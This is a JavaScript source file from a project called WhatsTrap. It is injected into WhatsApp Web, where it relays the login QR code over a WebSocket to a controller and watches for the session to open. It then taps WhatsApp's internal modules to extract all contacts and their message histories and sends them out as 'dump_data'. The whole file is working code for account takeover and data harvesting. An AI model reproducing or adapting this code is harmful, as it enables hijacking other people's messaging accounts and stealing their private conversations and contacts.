/**
 * @file src/puppet.js
 *
 * Copyright (C) 2018 | Giacomo Trudu aka `Wicker25`
 *
 * This file is part of WhatsTrap.
 *
 * WhatsTrap is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * WhatsTrap is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with WhatsTrap. If not, see <https://www.gnu.org/licenses/>.
 */

import _ from 'lodash';

import {
    Contact,
    Message,
    MessageQuery
} from './types';

/**
 * Returns DOM node by using XPath.
 */
const $x = (xpath) => {
    return document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
};

/**
 * The script to handle the login process.
 */
class LoginScript {
    constructor(puppet) {
        this._puppet = puppet;

        this.execute();
    }

    execute() {
        this._timer = setInterval(this._worker.bind(this), 100);
    }

    stop() {
        clearInterval(this._timer);
    }

    _worker() {
        // Look for the QR code and forward it to the Puppeteer
        const image = this._findQRCode();

        if (image && image.src !== image.dataset._last_src) {
            image.dataset._last_src = image.src;

            this._puppet.startAuth(image);
            return;
        }

        // Handle the manually refreshing of the QR code
        const button = this._findRefreshQRCodeButton();

        if (button) {
            button.click();

            this._puppet.debug('the QR Code has been manually refreshed');
            return;
        }

        // Detect when the session has been established
        const introMessage = this._findIntroMessage();

        if (introMessage) {
            this.stop();

            this._puppet.completeAuth();
            this._puppet.setState('analyze');
        }
    }

    _findQRCode() {
        return $x('//img[@alt="Scan me!" and starts-with(@src, "data:image/png;base64,")]');
    }

    _findRefreshQRCodeButton() {
        return $x('//div[@role="button" and contains(., "Click to reload QR code")]');
    }

    _findIntroMessage() {
        return $x('//h1[text()="Keep your phone connected"]');
    }
}

/**
 * The script to analyze the WhatsApp account.
 */
class AnalyzerScript {
    constructor(puppet) {
        this._puppet = puppet;

        this._whatsappModules = {
            'bcihgfbdeb': 'Store',
            'jfefjijii':  'Store.Conn',
            'djddhaidag': 'Store.Stream',
            'dgfhfgbdeb': 'Store.Wap',
        };

        this._user = null;
        this._contacts = [];
        this._messages = {};

        this.execute();
    }

    async execute() {
        this._activateEnv();

        await this._grabUser();
        await this._grabContacts();
        await this._grabMessages();
    }

    _activateEnv() {
        _.each(this._whatsappModules, (path, key) => {
            window.webpackJsonp([], {
                [key]: (x, y, z) => _.set(window, path, z(`"${key}"`)),
            }, key);
        });

        this._puppet.debug('the WhatsApp environment has been activated');
    }

    async _grabUser() {
        // TODO
    }

    async _grabContacts() {
        const response = await Store.Wap.contactFindQuery('search');
        this._contacts = response.data.map(payload => Contact.parse(payload));

        this._puppet.dumpData(this._contacts);
    }

    async _grabMessages() {
        this._contacts.forEach(async (contact) => {
            const response = await Store.Wap.msgFindQuery('before', new MessageQuery({ remote: `${contact.id}@c.us` }));
            this._messages[contact.id] = response.map(payload => Message.parse(payload));

            this._puppet.dumpData(this._messages[contact.id]);
        });
    }
}


/**
 * The Puppet executes in the hack in the webpage.
 */
export default class Puppet {
    constructor() {
        this._client = new window.WebSocket('ws://127.0.0.1:8080/');
        this._state = null;
    }

    live() {
        this.setState('login');
    }

    setState(state) {
        this._state = state;

        switch (this._state) {
            case 'login':   { new LoginScript(this);    break; }
            case 'analyze': { new AnalyzerScript(this); break; }

            default: {
                throw 'Unknown state';
            }
        }
    }

    startAuth(image) {
        this._send('auth_challenge', image.src);
    }

    completeAuth() {
        this._send('auth_completed');
    }

    dumpData(data) {
        this._send('dump_data', data);
    }

    debug(data) {
        this._send('debug', data);
    }

    _send(type, body) {
        this._client.send(
            JSON.stringify({ type, body })
        );
    }
}
